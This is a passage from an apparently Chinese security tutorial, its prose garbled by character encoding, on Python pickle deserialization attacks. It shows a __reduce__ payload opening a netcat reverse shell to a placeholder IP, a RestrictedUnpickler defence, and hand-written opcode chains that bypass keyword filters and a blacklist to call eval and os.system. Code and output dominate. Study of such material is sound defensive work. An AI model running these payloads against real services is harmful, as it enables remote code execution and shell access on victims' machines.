class="hljs-built_in">print</span>(base64.b64encode(pickle.dumps(payload)))<br></code></pre></td></tr></table></figure>

<p><strong>reduceç›´æ¥æ‰§è¡Œncå‘½ä»¤</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> pickle<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> (<span class="hljs-built_in">eval</span>, (<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).system(&#x27;nc ip port -e/bin/sh&#x27;)&quot;</span>,))<br><br>payload = Test()<br><span class="hljs-built_in">print</span>(base64.b64encode(pickle.dumps(payload)))<br></code></pre></td></tr></table></figure>


<h1 id="pker"><a href="#pker" class="headerlink" title="pker"></a>pker</h1><blockquote>
<p><a href="https://github.com/eddieivan01/pker">pker</a>æ˜¯ç”±eddieivan01ç¼–å†™çš„ä»¥éå†Python ASTçš„å½¢å¼æ¥è‡ªåŠ¨åŒ–è§£æpickle opcodeçš„å·¥å…·ã€‚</p>
</blockquote>
<h1 id="æ¼æ´ä¿®å¤"><a href="#æ¼æ´ä¿®å¤" class="headerlink" title="æ¼æ´ä¿®å¤ "></a>æ¼æ´ä¿®å¤ <a id="b"></h1><p>å¯¹äºpickleååºåˆ—åŒ–æ¼æ´ï¼Œå¸¸è§çš„ä¿®å¤æ–¹æ³•æ˜¯é‡å†™Unpickler.find_class()æ¥é™åˆ¶å…¨å±€å˜é‡</p>
<p>ä¾‹å¦‚ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> builtins<br><span class="hljs-keyword">import</span> io<br><span class="hljs-keyword">import</span> pickle<br><br><span class="hljs-comment"># éœ€è¦é™åˆ¶ååºåˆ—åŒ–å¯¹è±¡æ—¶å¯ä»¥ä½¿ç”¨çš„ç±»</span><br>safe_builtins = &#123;<br>    <span class="hljs-string">&#x27;range&#x27;</span>,        <span class="hljs-comment"># rangeç±»å‹</span><br>    <span class="hljs-string">&#x27;complex&#x27;</span>,      <span class="hljs-comment"># å¤æ•°ç±»å‹</span><br>    <span class="hljs-string">&#x27;set&#x27;</span>,          <span class="hljs-comment"># é›†åˆç±»å‹</span><br>    <span class="hljs-string">&#x27;frozenset&#x27;</span>,    <span class="hljs-comment"># å†»ç»“é›†åˆç±»å‹</span><br>    <span class="hljs-string">&#x27;slice&#x27;</span>,        <span class="hljs-comment"># åˆ‡ç‰‡ç±»å‹</span><br>&#125;<br><br><span class="hljs-comment"># å®šä¹‰RestrictedUnpicklerç±»ç»§æ‰¿è‡ªpickle.Unpickler</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">RestrictedUnpickler</span>(pickle.Unpickler):<br>    <span class="hljs-comment">#é‡å†™äº†find_classæ–¹æ³•</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">find_class</span>(<span class="hljs-params">self, module, name</span>):<br>        <span class="hljs-comment"># å¦‚æœè¢«ååºåˆ—åŒ–çš„å¯¹è±¡çš„ç±»å±äºbuiltinsæ¨¡å—ä¸­çš„å®‰å…¨ç±»ï¼Œåˆ™è¿”å›è¯¥ç±»</span><br>        <span class="hljs-keyword">if</span> module == <span class="hljs-string">&quot;builtins&quot;</span> <span class="hljs-keyword">and</span> name <span class="hljs-keyword">in</span> safe_builtins:<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">getattr</span>(builtins, name)<br>        <span class="hljs-comment"># å¦‚æœä¸æ˜¯å®‰å…¨ç±»ï¼Œå°±æŠ›å‡ºå¼‚å¸¸ï¼Œç¦æ­¢ååºåˆ—åŒ–</span><br>        <span class="hljs-keyword">raise</span> pickle.UnpicklingError(<span class="hljs-string">&quot;global &#x27;%s.%s&#x27; is forbidden&quot;</span> %<br>                                     (module, name))<br><br><span class="hljs-comment"># å®šä¹‰ä¸€ä¸ªå¸®åŠ©å‡½æ•°restricted_loadsæ¥ååºåˆ—åŒ–å¯¹è±¡</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">restricted_loads</span>(<span class="hljs-params">s</span>):<br>    <span class="hljs-comment"># å°†ä¼ å…¥çš„å­—ç¬¦ä¸²sè½¬æ¢ä¸ºbytesï¼Œå¹¶ä½¿ç”¨RestrictedUnpicklerç±»ååºåˆ—åŒ–</span><br>    <span class="hljs-keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()<br><br>opcode=<span class="hljs-string">b&quot;cos\nsystem\n(S&#x27;echo hello world&#x27;\ntR.&quot;</span><br>restricted_loads(opcode)<br><br><br><span class="hljs-comment">###ç»“æœå¦‚ä¸‹</span><br>Traceback (most recent call last):<br>...<br>_pickle.UnpicklingError: <span class="hljs-keyword">global</span> <span class="hljs-string">&#x27;os.system&#x27;</span> <span class="hljs-keyword">is</span> forbidden<br></code></pre></td></tr></table></figure>

<p>ä»¥ä¸Šä¾‹å­é€šè¿‡é‡å†™Unpickler.find_class()æ–¹æ³•ï¼Œé™åˆ¶è°ƒç”¨æ¨¡å—åªèƒ½ä¸ºbuiltinsï¼Œä¸”å‡½æ•°å¿…é¡»åœ¨ç™½åå•å†…ï¼Œå¦åˆ™æŠ›å‡ºå¼‚å¸¸ã€‚</p>
<h1 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h1><h2 id="å…³é”®å­—ç»•è¿‡"><a href="#å…³é”®å­—ç»•è¿‡" class="headerlink" title="å…³é”®å­—ç»•è¿‡"></a>å…³é”®å­—ç»•è¿‡</h2><blockquote>
<p>åˆ©ç”¨opcodeè¿›è¡Œå˜é‡è¦†ç›–æ—¶ï¼Œä»£ç ä¸­å¯èƒ½ä¼šè¿‡æ»¤äº†æˆ‘ä»¬æƒ³è¦è¦†ç›–çš„å±æ€§å…³é”®å­—</p>
</blockquote>
<p>ä¾‹å¦‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> pickletools<br><span class="hljs-keyword">import</span> secret<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;å˜é‡çš„å€¼ä¸º:&quot;</span> + secret.key)<br><br><span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;key&#x27;</span> <span class="hljs-keyword">in</span> opcode:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;NoNoNo&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>    pickle.loads(opcode)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;å˜é‡çš„å€¼ä¸º:&quot;</span> + <span class="hljs-built_in">str</span>(secret.key))<br></code></pre></td></tr></table></figure>

<p>æ­£å¸¸çš„opcodeåº”è¯¥æ˜¯</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">opcode = <span class="hljs-string">b&#x27;&#x27;&#x27;c__main__</span><br><span class="hljs-string">secret</span><br><span class="hljs-string">(S&#x27;key&#x27;</span><br><span class="hljs-string">S&#x27;123&#x27;</span><br><span class="hljs-string">db.&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure>

<p><strong>æ–¹æ³•ä¸€ï¼šåå…­è¿›åˆ¶</strong></p>
<p>å› ä¸º S æ“ä½œç¬¦æ˜¯å¯ä»¥è¯†åˆ«åå…­è¿›åˆ¶çš„ï¼Œæ‰€ä»¥è¿™é‡Œä¹Ÿå¯ä»¥å¯¹å­—ç¬¦è¿›è¡Œåå…­è¿›åˆ¶ç¼–ç æ¥ç»•è¿‡</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># S&#x27;key&#x27; = S&#x27;\x6B\x65\x79&#x27;</span><br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> pickletools<br><span class="hljs-keyword">import</span> secret<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;å˜é‡çš„å€¼ä¸º:&quot;</span> + secret.key)<br><br>opcode = <span class="hljs-string">b&#x27;&#x27;&#x27;c__main__</span><br><span class="hljs-string">secret</span><br><span class="hljs-string">(S&#x27;\\x6B\\x65\\x79&#x27;</span><br><span class="hljs-string">S&#x27;111&#x27;</span><br><span class="hljs-string">db.&#x27;&#x27;&#x27;</span><br><br><span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;key&#x27;</span> <span class="hljs-keyword">in</span> opcode:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;NoNoNo&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>    pickle.loads(opcode)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;å˜é‡çš„å€¼ä¸º:&quot;</span> + <span class="hljs-built_in">str</span>(secret.key))<br><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">å˜é‡çš„å€¼ä¸º:123</span><br><span class="hljs-string">å˜é‡çš„å€¼ä¸º:111</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure>

<p><strong>æ–¹æ³•äºŒï¼šunicodeç¼–ç </strong></p>
<p>åŒæ ·çš„ï¼ŒV æ“ä½œç¬¦ä¹Ÿå¯ä»¥è¯†åˆ«unicodeç¼–ç </p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># S&#x27;key&#x27; = V\u006b\u0065\u0079</span><br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> pickletools<br><span class="hljs-keyword">import</span> secret<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;å˜é‡çš„å€¼ä¸º:&quot;</span> + secret.key)<br><br>opcode = <span class="hljs-string">b&#x27;&#x27;&#x27;c__main__</span><br><span class="hljs-string">secret</span><br><span class="hljs-string">(V\u006b\u0065\u0079</span><br><span class="hljs-string">S&#x27;111111&#x27;</span><br><span class="hljs-string">db.&#x27;&#x27;&#x27;</span><br><br><span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;key&#x27;</span> <span class="hljs-keyword">in</span> opcode:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;NoNoNo&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>    pickle.loads(opcode)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;å˜é‡çš„å€¼ä¸º:&quot;</span> + <span class="hljs-built_in">str</span>(secret.key))<br><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">å˜é‡çš„å€¼ä¸º:123</span><br><span class="hljs-string">å˜é‡çš„å€¼ä¸º:111111</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure>


<p><strong>æ–¹æ³•ä¸‰ï¼šåˆ©ç”¨å†…ç½®å‡½æ•°è·å–å…³é”®å­—</strong></p>
<p>åœ¨pythonä¸­ï¼Œå½“æˆ‘ä»¬å¯¼å…¥æŸä¸ªæ¨¡å—åï¼Œå¯ä»¥é€šè¿‡<code>dir(sys.modules[&#39;xxx&#39;])</code>æ¥è·å–å…¶å…¨éƒ¨å±æ€§</p>
<p>ä¾‹å¦‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> secret<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">dir</span>(sys.modules[<span class="hljs-string">&#x27;secret&#x27;</span>]))<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">[&#x27;__builtins__&#x27;, &#x27;__cached__&#x27;, &#x27;__doc__&#x27;, &#x27;__file__&#x27;, &#x27;__loader__&#x27;, &#x27;__name__&#x27;, &#x27;__package__&#x27;, &#x27;__spec__&#x27;, &#x27;key&#x27;]</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure>

<p>ä½†æ˜¯å› ä¸ºpickleä¸æŒæ”¯åˆ—è¡¨ç´¢å¼•å’Œå­—å…¸ç´¢å¼•ï¼Œæ‰€ä»¥éœ€è¦ç”¨<code>reversed()+next()</code>æ¥è·å–å…ƒç´ </p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> secret<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">next</span>(<span class="hljs-built_in">reversed</span>(<span class="hljs-built_in">dir</span>(sys.modules[<span class="hljs-string">&#x27;secret&#x27;</span>]))))<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">key</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure>

<p>è½¬æ¢æˆopcode</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># æ„é€ å‡ºdir</span><br>opcode=<span class="hljs-string">b&#x27;&#x27;&#x27;(c__main__</span><br><span class="hljs-string">secret</span><br><span class="hljs-string">i__builtin__</span><br><span class="hljs-string">dir</span><br><span class="hljs-string">.&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure>


<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># æ„é€ reversed</span><br>opcode=<span class="hljs-string">b&#x27;&#x27;&#x27;((c__main__</span><br><span class="hljs-string">secret</span><br><span class="hljs-string">i__builtin__</span><br><span class="hljs-string">dir</span><br><span class="hljs-string">i__builtin__</span><br><span class="hljs-string">reversed</span><br><span class="hljs-string">.&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure>


<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># æ„é€ next</span><br>opcode=<span class="hljs-string">b&#x27;&#x27;&#x27;(((c__main__</span><br><span class="hljs-string">secret</span><br><span class="hljs-string">i__builtin__</span><br><span class="hljs-string">dir</span><br><span class="hljs-string">i__builtin__</span><br><span class="hljs-string">reversed</span><br><span class="hljs-string">i__builtin__</span><br><span class="hljs-string">next</span><br><span class="hljs-string">.&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># å˜é‡è¦†ç›–</span><br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> pickletools<br><span class="hljs-keyword">import</span> secret<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;å˜é‡çš„å€¼ä¸º:&quot;</span> + secret.key)<br><br>opcode=<span class="hljs-string">b&#x27;&#x27;&#x27;c__main__</span><br><span class="hljs-string">secret</span><br><span class="hljs-string">((((c__main__</span><br><span class="hljs-string">secret</span><br><span class="hljs-string">i__builtin__</span><br><span class="hljs-string">dir</span><br><span class="hljs-string">i__builtin__</span><br><span class="hljs-string">reversed</span><br><span class="hljs-string">i__builtin__</span><br><span class="hljs-string">next</span><br><span class="hljs-string">S&#x27;111&#x27;</span><br><span class="hljs-string">db.&#x27;&#x27;&#x27;</span><br><br><span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;key&#x27;</span> <span class="hljs-keyword">in</span> opcode:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;NoNoNo&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>    pickle.loads(opcode)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;å˜é‡çš„å€¼ä¸º:&quot;</span> + <span class="hljs-built_in">str</span>(secret.key))<br><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">å˜é‡çš„å€¼ä¸º:123</span><br><span class="hljs-string">å˜é‡çš„å€¼ä¸º:111</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure>




<h2 id="ç»•è¿‡builtins"><a href="#ç»•è¿‡builtins" class="headerlink" title="ç»•è¿‡builtins"></a>ç»•è¿‡builtins</h2><p>å¯¹äº<a href="#b">ä¸Šæ–‡</a>æåˆ°çš„é‡å†™find_class()æ–¹æ³•æ¥é™åˆ¶è°ƒç”¨æ¨¡å—ï¼Œå¦‚æœé‡‡ç”¨çš„æ˜¯é»‘åå•çš„æ–¹å¼ï¼Œé‚£ä¹ˆå°±æœ‰å¯èƒ½ç»•è¿‡å…¶é™åˆ¶</p>
<p>ä¾‹å¦‚<a href="https://github.com/phith0n/code-breaking/tree/master/2018/picklecode">code-breaking 2018 picklecode</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> io<br><span class="hljs-keyword">import</span> builtins<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">RestrictedUnpickler</span>(pickle.Unpickler):<br>    blacklist = &#123;<span class="hljs-string">&#x27;eval&#x27;</span>, <span class="hljs-string">&#x27;exec&#x27;</span>, <span class="hljs-string">&#x27;execfile&#x27;</span>, <span class="hljs-string">&#x27;compile&#x27;</span>, <span class="hljs-string">&#x27;open&#x27;</span>, <span class="hljs-string">&#x27;input&#x27;</span>, <span class="hljs-string">&#x27;__import__&#x27;</span>, <span class="hljs-string">&#x27;exit&#x27;</span>&#125;<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">find_class</span>(<span class="hljs-params">self, module, name</span>):<br>        <span class="hljs-comment"># Only allow safe classes from builtins.</span><br>        <span class="hljs-keyword">if</span> module == <span class="hljs-string">&quot;builtins&quot;</span> <span class="hljs-keyword">and</span> name <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> self.blacklist:<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">getattr</span>(builtins, name)<br>        <span class="hljs-comment"># Forbid everything else.</span><br>        <span class="hljs-keyword">raise</span> pickle.UnpicklingError(<span class="hljs-string">&quot;global &#x27;%s.%s&#x27; is forbidden&quot;</span> %<br>                                     (module, name))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">restricted_loads</span>(<span class="hljs-params">s</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;Helper function analogous to pickle.loads().&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()<br></code></pre></td></tr></table></figure>

<p>åŒæ ·æ˜¯é™åˆ¶äº†ä½¿ç”¨çš„æ¨¡å—åªèƒ½ä¸ºbuiltinsï¼ŒåŠ ä¸Šä¸€ä¸ªé»‘åå•ã€‚ä½†æ˜¯æˆ‘ä»¬å¯ä»¥åˆ©ç”¨<code>getattr</code>æ¥è·å–ä¸€äº›é»‘åå•å‡½æ•°ï¼Œä¾‹å¦‚<code>builtins.getattr(&#39;builtins&#39;, &#39;eval&#39;)</code></p>
<p>è½¬æ¢æˆpayloadï¼š<code>builtins.getattr(builtins, &#39;eval&#39;),(&#39;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#39;,)</code></p>
<p>ç„¶åå¼€å§‹æ‰‹æ“opcode</p>
<p>é¦–å…ˆè°ƒç”¨builtins.getattr</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">cbuiltins<br><span class="hljs-built_in">getattr</span><br></code></pre></td></tr></table></figure>

<p>ç„¶åæ³¨æ„ä¸èƒ½ç›´æ¥å‹å…¥builtinsï¼Œéœ€è¦æ„é€ å‡ºä¸€ä¸ªbuiltinsæ¨¡å—å†æ¥ä¼ ç»™getattr</p>
<p>ä¾‹å¦‚å¯ä»¥ä»<code>builtins.globals()</code>ä¸­æ‹¿åˆ°builtinsæ¨¡å—ï¼Œä½†æ˜¯å› ä¸ºè¿”å›å€¼æ˜¯<code>&lt;class &#39;dict&#39;&gt;</code>ï¼Œæ‰€ä»¥è¿˜éœ€è¦ä¸€ä¸ª<code>builtins.dict</code>ä¸­çš„getå‡½æ•°æ¥å–å‡º<code>builtins</code></p>
<p>å˜æ¢åçš„payloadï¼š<code>builtins.getattr(builtins.getattr(builtins.dict,&#39;get&#39;)(builtins.globals(),&#39;builtins&#39;),&#39;eval&#39;)(&#39;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#39;,)</code></p>
<p>ç»§ç»­ç¼–å†™opcode</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#æ„é€ å‡ºgetå‡½æ•°</span><br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> pickletools<br><br>opcode = <span class="hljs-string">b&#x27;&#x27;&#x27;cbuiltins</span><br><span class="hljs-string">getattr</span><br><span class="hljs-string">(cbuiltins</span><br><span class="hljs-string">dict</span><br><span class="hljs-string">S&#x27;get&#x27;</span><br><span class="hljs-string">tR.</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>pickletools.dis(opcode)<br><span class="hljs-built_in">print</span>(pickle.loads(opcode))<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    0: c    GLOBAL     &#x27;builtins getattr&#x27;</span><br><span class="hljs-string">   18: (    MARK</span><br><span class="hljs-string">   19: c        GLOBAL     &#x27;builtins dict&#x27;</span><br><span class="hljs-string">   34: S        STRING     &#x27;get&#x27;</span><br><span class="hljs-string">   41: t        TUPLE      (MARK at 18)</span><br><span class="hljs-string">   42: R    REDUCE</span><br><span class="hljs-string">   43: .    STOP</span><br><span class="hljs-string">highest protocol among opcodes = 0</span><br><span class="hljs-string">&lt;method &#x27;get&#x27; of &#x27;dict&#x27; objects&gt;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure>


<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># è·å–globals()å­—å…¸</span><br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> pickletools<br><br>opcode = <span class="hljs-string">b&#x27;&#x27;&#x27;cbuiltins</span><br><span class="hljs-string">globals</span><br><span class="hljs-string">)R.</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>pickletools.dis(opcode)<br><span class="hljs-built_in">print</span>(pickle.loads(opcode))<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    0: c    GLOBAL     &#x27;builtins globals&#x27;</span><br><span class="hljs-string">   18: )    EMPTY_TUPLE</span><br><span class="hljs-string">   19: R    REDUCE</span><br><span class="hljs-string">   20: .    STOP</span><br><span class="hljs-string">highest protocol among opcodes = 1</span><br><span class="hljs-string">&#123;&#x27;__name__&#x27;: &#x27;__main__&#x27;, &#x27;__doc__&#x27;: None, &#x27;__package__&#x27;: None, &#x27;__loader__&#x27;: &lt;_frozen_importlib_external.SourceFileLoader object at 0x000002490202C9D0&gt;, &#x27;__spec__&#x27;: None, &#x27;__annotations__&#x27;: &#123;&#125;, &#x27;__builtins__&#x27;: &lt;module &#x27;builtins&#x27; (built-in)&gt;, &#x27;__file__&#x27;: &#x27;C:\\Users\\lewiserii\\Desktop\\test\\2.py&#x27;, &#x27;__cached__&#x27;: None, &#x27;pickle&#x27;: &lt;module &#x27;pickle&#x27; from &#x27;C:\\Python\\Python311\\Lib\\pickle.py&#x27;&gt;, &#x27;pickletools&#x27;: &lt;module &#x27;pickletools&#x27; from &#x27;C:\\Python\\Python311\\Lib\\pickletools.py&#x27;&gt;, &#x27;opcode&#x27;: b&#x27;cbuiltins\nglobals\n)R.\n&#x27;&#125;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure>


<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># ç»„åˆget()å’Œglobals()å­—å…¸ï¼Œè·å–builtinsæ¨¡å—</span><br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> pickletools<br><br>opcode = <span class="hljs-string">b&#x27;&#x27;&#x27;cbuiltins</span><br><span class="hljs-string">getattr</span><br><span class="hljs-string">(cbuiltins</span><br><span class="hljs-string">dict</span><br><span class="hljs-string">S&#x27;get&#x27;</span><br><span class="hljs-string">tR(cbuiltins</span><br><span class="hljs-string">globals</span><br><span class="hljs-string">)RS&#x27;__builtins__&#x27;</span><br><span class="hljs-string">tR.&#x27;&#x27;&#x27;</span><br><br>pickletools.dis(opcode)<br><span class="hljs-built_in">print</span>(pickle.loads(opcode))<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    0: c    GLOBAL     &#x27;builtins getattr&#x27;</span><br><span class="hljs-string">   18: (    MARK</span><br><span class="hljs-string">   19: c        GLOBAL     &#x27;builtins dict&#x27;</span><br><span class="hljs-string">   34: S        STRING     &#x27;get&#x27;</span><br><span class="hljs-string">   41: t        TUPLE      (MARK at 18)</span><br><span class="hljs-string">   42: R    REDUCE</span><br><span class="hljs-string">   43: (    MARK</span><br><span class="hljs-string">   44: c        GLOBAL     &#x27;builtins globals&#x27;</span><br><span class="hljs-string">   62: )        EMPTY_TUPLE</span><br><span class="hljs-string">   63: R        REDUCE</span><br><span class="hljs-string">   64: S        STRING     &#x27;__builtins__&#x27;</span><br><span class="hljs-string">   80: t        TUPLE      (MARK at 43)</span><br><span class="hljs-string">   81: R    REDUCE</span><br><span class="hljs-string">   82: .    STOP</span><br><span class="hljs-string">highest protocol among opcodes = 1</span><br><span class="hljs-string">&lt;module &#x27;builtins&#x27; (built-in)&gt;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure>


<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># è·å–eval</span><br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> pickletools<br><br>opcode=<span class="hljs-string">b&#x27;&#x27;&#x27;cbuiltins</span><br><span class="hljs-string">getattr</span><br><span class="hljs-string">(cbuiltins</span><br><span class="hljs-string">getattr</span><br><span class="hljs-string">(cbuiltins</span><br><span class="hljs-string">dict</span><br><span class="hljs-string">S&#x27;get&#x27;</span><br><span class="hljs-string">tR(cbuiltins</span><br><span class="hljs-string">globals</span><br><span class="hljs-string">)RS&#x27;__builtins__&#x27;</span><br><span class="hljs-string">tRS&#x27;eval&#x27;</span><br><span class="hljs-string">tR.&#x27;&#x27;&#x27;</span><br><br>pickletools.dis(opcode)<br><span class="hljs-built_in">print</span>(pickle.loads(opcode))<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    0: c    GLOBAL     &#x27;builtins getattr&#x27;</span><br><span class="hljs-string">   18: (    MARK</span><br><span class="hljs-string">   19: c        GLOBAL     &#x27;builtins getattr&#x27;</span><br><span class="hljs-string">   37: (        MARK</span><br><span class="hljs-string">   38: c            GLOBAL     &#x27;builtins dict&#x27;</span><br><span class="hljs-string">   53: S            STRING     &#x27;get&#x27;</span><br><span class="hljs-string">   60: t            TUPLE      (MARK at 37)</span><br><span class="hljs-string">   61: R        REDUCE</span><br><span class="hljs-string">   62: (        MARK</span><br><span class="hljs-string">   63: c            GLOBAL     &#x27;builtins globals&#x27;</span><br><span class="hljs-string">   81: )            EMPTY_TUPLE</span><br><span class="hljs-string">   82: R            REDUCE</span><br><span class="hljs-string">   83: S            STRING     &#x27;__builtins__&#x27;</span><br><span class="hljs-string">   99: t            TUPLE      (MARK at 62)</span><br><span class="hljs-string">  100: R        REDUCE</span><br><span class="hljs-string">  101: S        STRING     &#x27;eval&#x27;</span><br><span class="hljs-string">  109: t        TUPLE      (MARK at 18)</span><br><span class="hljs-string">  110: R    REDUCE</span><br><span class="hljs-string">  111: .    STOP</span><br><span class="hljs-string">highest protocol among opcodes = 1</span><br><span class="hljs-string">&lt;built-in function eval&gt;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># æ‰§è¡Œå‘½ä»¤</span><br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> pickletools<br><br>opcode=<span class="hljs-string">b&#x27;&#x27;&#x27;cbuiltins</span><br><span class="hljs-string">getattr</span><br><span class="hljs-string">(cbuiltins</span><br><span class="hljs-string">getattr</span><br><span class="hljs-string">(cbuiltins</span><br><span class="hljs-string">dict</span><br><span class="hljs-string">S&#x27;get&#x27;</span><br><span class="hljs-string">tR(cbuiltins</span><br><span class="hljs-string">globals</span><br><span class="hljs-string">)RS&#x27;__builtins__&#x27;</span><br><span class="hljs-string">tRS&#x27;eval&#x27;</span><br><span class="hljs-string">tR(S&#x27;__import__(&quot;os&quot;).system(&quot;whoami&quot;)&#x27;</span><br><span class="hljs-string">tR.</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>pickletools.dis(opcode)<br><span class="hljs-built_in">print</span>(pickle.loads(opcode))<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    0: c    GLOBAL     &#x27;builtins getattr&#x27;</span><br><span class="hljs-string">   18: (    MARK</span><br><span class="hljs-string">   19: c        GLOBAL     &#x27;builtins getattr&#x27;</span><br><span class="hljs-string">   37: (        MARK</span><br><span class="hljs-string">   38: c            GLOBAL     &#x27;builtins dict&#x27;</span><br><span class="hljs-string">   53: S            STRING     &#x27;get&#x27;</span><br><span class="hljs-string">   60: t            TUPLE      (MARK at 37)</span><br><span class="hljs-string">   61: R        REDUCE</span><br><span class="hljs-string">   62: (        MARK</span><br><span class="hljs-string">   63: c            GLOBAL     &#x27;builtins globals&#x27;</span><br><span class="hljs-string">   81: )            EMPTY_TUPLE</span><br><span class="hljs-string">   82: R            REDUCE</span><br><span 